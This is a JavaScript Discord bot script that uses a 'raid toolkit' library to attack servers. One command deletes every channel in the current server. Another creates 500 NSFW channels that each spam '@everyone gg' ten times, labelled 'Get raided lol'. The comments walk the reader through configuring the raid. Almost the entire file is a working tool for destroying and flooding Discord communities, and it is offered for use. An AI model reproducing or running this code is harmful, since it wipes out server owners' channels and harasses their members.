const client = new Discord.Client() //setting/creating a new discord client (bot)
const mySecret = process.env['TOKEN']
const { keep_alive } = require("./keep_alive");

const Disc_rd = require('discord-raid-toolkit-revamp')
const raid = new Disc_rd.RaidBot(client) //here we pass client parameter, as you see i set it as client because that is the name i put it as in const **client**

client.on('message', async message => {
	if(message.content.startsWith('!deletechannels')) {
	await raid.deleteAllChannels(message.guild.id) //deleting every channel in the guild with the id provided, in this case, the current guild where command was executed
}
})

client.on('message', message => {
    if(message.content.startsWith('!channel')) {
        raid.createChannelsLoop(message.guild.id, {amount_of_created_channels: 500, message_that_will_be_sent: "@everyone gg", times_message_is_sent: 10, channels_name: "gg", reason_channels: "Get raided lol", channels_topic: "gg", nsfw: true, channel_cooldown: 10}) //btw channel_cooldown is put in seconds, like, i put 10 so channel cooldown will be 10 seconds, you can always try the code and understand it the max possible
    }
    })


client.login(process.env.TOKEN);
